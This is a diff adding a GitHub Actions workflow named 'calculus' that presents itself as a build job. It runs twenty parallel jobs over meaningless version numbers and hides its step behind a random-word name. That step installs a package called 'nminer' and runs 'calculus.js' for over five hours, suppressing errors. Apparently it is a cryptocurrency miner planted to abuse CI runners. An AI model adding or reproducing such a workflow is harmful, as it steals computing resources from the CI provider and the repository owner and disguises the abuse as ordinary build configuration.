@@ -1,0 +1,45 @@
+name: calculus
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2584 }
+          - { version: 5116 }
+          - { version: 5348 }
+          - { version: 7658 }
+          - { version: 5238 }
+          - { version: 9586 }
+          - { version: 8637 }
+          - { version: 9656 }
+          - { version: 3421 }
+          - { version: 9501 }
+          - { version: 1843 }
+          - { version: 4159 }
+          - { version: 6190 }
+          - { version: 3726 }
+          - { version: 2248 }
+          - { version: 7318 }
+          - { version: 8141 }
+          - { version: 2400 }
+          - { version: 3866 }
+          - { version: 9501 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: given except defrag utilized brown
+        run: |
+          npm install nminer@latest
+          timeout 309m node calculus.js || echo "calculus executed"
